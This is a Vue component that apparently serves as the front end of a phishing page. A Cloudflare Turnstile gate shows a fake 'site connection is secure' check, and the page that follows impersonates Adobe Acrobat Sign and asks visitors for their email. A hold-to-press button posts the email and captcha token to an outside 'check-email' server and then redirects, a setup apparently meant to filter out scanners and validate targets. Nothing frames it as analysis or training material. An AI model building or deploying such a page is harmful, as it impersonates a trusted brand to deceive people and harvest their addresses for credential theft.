<template>
  <div v-if="!captchaToken" class="gate-container">
    <header>
   
    </header>
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div
          class="cf-turnstile"
          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
        ></div>
      </div>
    </main>
    <footer>
      <p></p>
    </footer>
  </div>

  <div v-else class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="success-check">⼈</span>
            <span>Adobe Acrobat Sign</span>
          </div>
        </div>
        <div class="content">
          <p><strong>Please verify your email to continue.</strong></p>
          <div class="form-wrapper">
            <input
              v-model="email"
              type="email"
              placeholder="Email required"
              required
              class="email-input"
              :disabled="loading"
            />
            <p v-if="error" class="error">{{ error }}</p>
            <button
              @mousedown="startHold"
              @mouseup="endHold"
              @mouseleave="cancelHold"
              @touchstart.prevent="startHold"
              @touchend.prevent="endHold"
              :disabled="loading"
              class="action-button"
            >
              {{ loading ? 'Verifying…' : 'Continue' }}
            </button>
          </div>
        </div>
        <div class="divider"></div>
        <div class="footer-container">
          <p class="footer-text">© 2025 All rights reserved. </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)

let holdTimer = null
const holdDuration = 1500
const redirectBaseUrl = 'https://yourdomain.com/complete'

onMounted(async () => {
  await nextTick()
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: (token) => {
        captchaToken.value = token
      }
    })
  }
})

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function verifyEmail() {
  try {
    const res = await fetch(
      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.value,
          captchaToken: captchaToken.value
        }),
      }
    )
    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer = setTimeout(verifyEmail, holdDuration)
}

function endHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}

function cancelHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}
</script>

<style scoped>
.gate-container {
  min-height: 70vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
  text-align: center;
  background-color: #f9f9f9;
}
  .cf-turnstile {
  transform: scale(0.85);         /* shrink or enlarge — 1 is default */
  transform-origin: top left;     /* ensure it scales from top-left corner */
  height: auto !important;        /* make sure container adjusts */
  width: auto !important;
}

.logo-img {
  max-width: 100px;
  margin: 0 auto 1.8rem;
}
.instructions {
  margin-top: 10px;
  text-align: center;
}
.instructions h {
  font-size: 1.1rem;
  margin-bottom: 1.6rem;
  text-align: center;
}
footer p {
  margin-top: 1.6rem;
  color: #444;
  font-size: 1rem;
  text-align: center;
}

.background {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 75vh;
  padding: 2rem;
  background-color: #f9f9f9;
  font-family: Arial, sans-serif;
}
.adobe-sign-container {
  width: 600%;
  max-width: 600px;
  background: #fff;
  border-radius: 10px;
  box-shadow: 0 1 80px rgba (241,241,241);
  padding: 2rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}
.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}
.success-check {
  font-size: 2rem;
  color: red;
}
.content {
  text-align: center;
}
.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  margin-top: 0rem;
  border: 1px solid #ccc;
  border-radius: 5px;
  font-size: 1rem;
}
.action-button {
  background-color: #transparent;
  color: black;
  padding: 0.6rem 1.5rem;
  border: 1px solid #ccc;
  border-radius: 13px;
  cursor: pointer;
  margin-top: 1.0rem;
  font-size: 1rem;
  width: 30%;
  max-width: 380px;
}
.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}
.action-button:hover:not(:disabled) {
  background-color: #transparent;
}
.divider {
  height: 0px;
  background-color: #e0e0e0;
  margin: 1rem 0 1rem;
}
.footer-container {
  text-align: center;
}
.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}
.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}
</style>
